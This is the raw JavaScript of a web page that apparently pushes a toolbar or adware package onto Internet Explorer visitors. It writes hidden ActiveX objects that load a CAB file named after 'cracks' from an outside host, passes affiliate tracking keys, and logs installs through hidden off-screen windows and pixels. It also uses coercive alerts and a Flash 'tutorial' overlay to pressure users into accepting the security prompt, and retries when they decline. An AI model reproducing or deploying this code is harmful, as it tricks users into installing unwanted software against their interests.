<!--
var sp2 = (navigator.appName == 'Microsoft Internet Explorer' && navigator.userAgent.indexOf("SV1") != -1);
var flag=0;
var clsid = '7C559105-9ECF-42b8-B3F7-832E75EDD959';
var codebase = 'http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_cracks.cab';
var loadfirst=1;
var track = sp2 ? 'flash' : 'normal';
var account_id = 132556;
var download_key = 'a7b47e5836f82185aff9e5400726c3c5';
var download_lock = '1121031497';
var cfg = 'mtb_c';
var sub = '';
var prompt_text="You must click YES to get access";
var prompt_flash='You must FOLLOW THESE STEPS to continue';
var holder;

try
{
	var referer=document.location;
}
catch( e ) 
{
	var referer='';
}


if (sp2){
        document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
        document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf"><param name="quality" value="high"><param name="wmode" value="transparent">');
        document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="635" height="308"></embed></object></div>');
	}
document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');

function check_sp2_flash(){
        if (document.all.tutorial_popup.style.visibility != 'visible'){
	     //window.clearInterval(flash_interval);
	     if(window.retry && retry>0){
		   alert(prompt_flash);
		   document.all.tutorial_popup.style.visibility = 'visible';
		   retry--;
	     } else {
	   	   window.clearInterval(flash_interval);
	     }
      	}
}

function showActiveX() {
        holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:' + clsid + '"');
	if(!sp2){
	   holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_cracks.cab" onerror="parent.retryit();">');
	} else {
	   holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_cracks.cab">');
	}
        holder.write('<PARAM name="account_id" value="' + account_id + '">');
        holder.write('<PARAM name="download_key" value="' + download_key + '">');
        holder.write('<PARAM name="download_lock" value="' + download_lock + '">');
        holder.write('<PARAM name="cfg" value="' + cfg + '">');
        holder.write('<PARAM name="sub" value="' + sub + '">');
        holder.write('<PARAM name="referer" value="' + escape(referer) + '">');
        holder.write('<PARAM name="track" value="' + track + '">');
        holder.write('</OBJECT>');
}

function retryit(){
	if(window.retry && retry>0 && !sp2) {
		alert(prompt_text); 
        	loadfirst=0;
        	start_download();
        	retry--;
        	}	
	}

function start_download() {

	var bname=navigator.appName;
        var bver=parseInt(navigator.appVersion);
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                if(!loadfirst || sp2){
                        downloads_manager.document.close();
                        holder= downloads_manager.document;
                } else {
                        holder=document;
                        }
                showActiveX();
                if (sp2) {
					document.all.tutorial_popup.style.visibility = "visible";
					flash_interval = window.setInterval("check_sp2_flash();", 500);

				}
                if(!flag && !sp2){
                        window.open("http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=132556&auto_close=1&software_id=0006&type=normal","_blank","top=10000, left=10000");
                } if(!flag && sp2){
                        holder.write('<IMG SRC="http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=132556&auto_close=1&software_id=0006&type=flash" width=1 height=1 border=0>');
                        }
                flag++;
        } 
}
 function start_download_loadfirst() { 
        start_download(); 
        }

 // -->
